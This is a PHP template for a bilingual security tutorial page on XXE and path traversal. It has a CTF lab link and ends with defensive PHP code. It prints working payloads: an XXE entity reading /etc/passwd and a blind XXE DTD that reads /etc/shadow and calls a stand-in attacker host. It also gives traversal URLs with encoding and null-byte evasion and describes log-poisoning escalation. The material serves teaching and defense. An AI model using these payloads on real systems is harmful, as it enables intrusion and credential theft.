<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'XXE y Path Traversal — CyberEscudo' : 'XXE & Path Traversal — CyberEscudo';
$contentTitle = $lang==='es' ? 'XXE y Path Traversal' : 'XXE & Path Traversal';
$contentDate  = '2022-05-05';
$contentTags  = ['XXE','Path Traversal','LFI','OWASP','XML'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Explotación de vulnerabilidades <strong>XXE</strong> (XML External Entities) y <strong>Path Traversal</strong> (Directory Traversal). Ambas vulnerabilidades abusan de la forma en que el servidor lee e interactúa con el sistema de archivos local y fuentes externas.</p>

  <h2>1. XXE — Entidades Externas XML</h2>
  <p>El estándar XML permite el uso de DTD (Document Type Definition) para definir la estructura del documento. Dentro del DTD, se pueden declarar <em>Entidades Externas</em>, que actúan como variables dinámicas que el parser XML rellena haciendo llamadas al sistema operativo (por ejemplo, leyendo un archivo o haciendo peticiones HTTP).</p>

  <h3>Payload clásico — Leer archivos locales</h3>
  <p>Si la aplicación web recibe XML (ej: en una API o subida de archivos SVG) y no tiene las entidades deshabilitadas, podemos obligarla a leer <code>/etc/passwd</code> y mostrarlo en la respuesta:</p>
  <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
  &lt;data&gt;&amp;xxe;&lt;/data&gt;
&lt;/root&gt;</code></pre>

  <h3>XXE Out-of-Band (Blind XXE)</h3>
  <p>A veces, la aplicación parsea el XML pero no muestra el resultado en la pantalla (XXE Ciego). Para exfiltrar datos, usamos entidades paramétricas que envían el contenido del archivo a nuestro servidor atacante a través de la URL:</p>
  <pre><code>&lt;!DOCTYPE foo [
  &lt;!ENTITY % file SYSTEM "file:///etc/shadow"&gt;
  &lt;!ENTITY % dtd SYSTEM "http://servidor-atacante.com/malicioso.dtd"&gt;
  %dtd;
]&gt;</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 05 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Laboratorio XXE
      </h3>
      <p style="margin-bottom: 1.5rem;">He creado un punto final de una API simulada que procesa comprobaciones de Stock mediante XML. El parser es vulnerable. Tu misión es inyectar una Entidad Externa (SYSTEM) para leer el archivo <code>/etc/passwd</code>.</p>
      <a href="/ctf/ctf-05.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 05
      </a>
  </div>

  <h2>2. Path Traversal (Directory Traversal)</h2>
  <p>El Path Traversal permite a un atacante leer (y a veces escribir) archivos arbitrarios en el servidor web saltándose el directorio raíz permitido, utilizando la secuencia <code>../</code> (subir un nivel de directorio).</p>

  <h3>Evasión de filtros y Técnicas</h3>
  <p>Muchos WAFs bloquean el string literal <code>../</code>. Los atacantes usan codificación para evadir estas defensas:</p>
  <pre><code># Básico:
http://target.com/view?page=../../../../etc/passwd

# URL Encoding:
http://target.com/file?name=..%2F..%2F..%2Fetc%2Fpasswd

# Null Byte (útil en PHP < 5.3 para cortar extensiones forzadas):
http://target.com/file?name=../../../etc/passwd%00.jpg</code></pre>

  <h3>De Path Traversal a Ejecución de Código (Log Poisoning)</h3>
  <p>Si podemos leer archivos locales, a menudo podemos leer los logs del servidor Apache (<code>/var/log/apache2/access.log</code>). Si inyectamos código PHP en nuestro <code>User-Agent</code> al hacer una petición normal y luego usamos Path Traversal para incluir ese log en la página web, el servidor ejecutará nuestro código PHP.</p>

  <h2>3. Contramedidas</h2>
  <pre><code>&lt;?php
/* CONTRAMEDIDA XXE */
// A partir de PHP 8, las entidades externas están deshabilitadas por defecto.
// Para versiones anteriores:
libxml_disable_entity_loader(true);

/* CONTRAMEDIDA PATH TRAVERSAL */
// 1. Evitar usar el input del usuario como nombre de archivo.
// 2. Si es necesario, usar realpath() y validar el directorio base:
$base_dir = '/var/www/archivos/';
$real_path = realpath($base_dir . $_GET['file']);

if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
    die('Acceso denegado. Intento de evasión detectado.');
}
readfile($real_path);
?&gt;</code></pre>
</div>

<?php else: ?>
<div class="prose">
  <p>Exploitation of <strong>XXE</strong> (XML External Entities) and <strong>Path Traversal</strong> vulnerabilities. Both attacks abuse how the server reads and interacts with the local file system and external sources.</p>

  <h2>1. XXE — XML External Entities</h2>
  <p>The XML standard allows the use of DTDs (Document Type Definitions). Within a DTD, <em>External Entities</em> can be declared. These act as dynamic variables that the XML parser fills by making system calls (like reading local files or making HTTP requests).</p>

  <h3>Classic Payload — Reading local files</h3>
  <p>If the web app parses user-supplied XML without disabling external entities, we can force it to read files like <code>/etc/passwd</code>:</p>
  <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 05 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> XXE Laboratory
      </h3>
      <p style="margin-bottom: 1.5rem;">I've created a simulated API endpoint that processes Stock checks via XML. The parser is vulnerable. Your mission is to inject an External Entity (SYSTEM) to read the <code>/etc/passwd</code> file.</p>
      <a href="/ctf/ctf-05.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 05 CHALLENGE
      </a>
  </div>

  <h2>2. Path Traversal</h2>
  <p>Allows an attacker to read arbitrary files on the web server by escaping the allowed root directory using <code>../</code> sequences.</p>

  <h3>Exploitation and Evasion</h3>
  <pre><code">http://target.com/download?file=../../../etc/passwd
http://target.com/file?name=..%2F..%2F..%2Fetc%2Fpasswd   # URL encoded
http://target.com/file?name=../../../etc/passwd%00.jpg   # Null Byte</code></pre>

  <h3>Escalation to RCE (Log Poisoning)</h3>
  <p>If we can read local files, we can often read Apache logs. By injecting malicious PHP into our <code>User-Agent</code> header and using Path Traversal to include the log file in the webpage, the server will execute our PHP code.</p>

  <h2>3. Countermeasures</h2>
  <pre><code>&lt;?php
/* XXE DEFENSE */
libxml_disable_entity_loader(true); // Disable for PHP < 8.0

/* PATH TRAVERSAL DEFENSE */
$base = '/var/www/files/';
$real = realpath($base . $_GET['file']);
if ($real === false || strpos($real, $base) !== 0) {
    http_response_code(403); die('Access denied');
}
readfile($real);
?&gt;</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';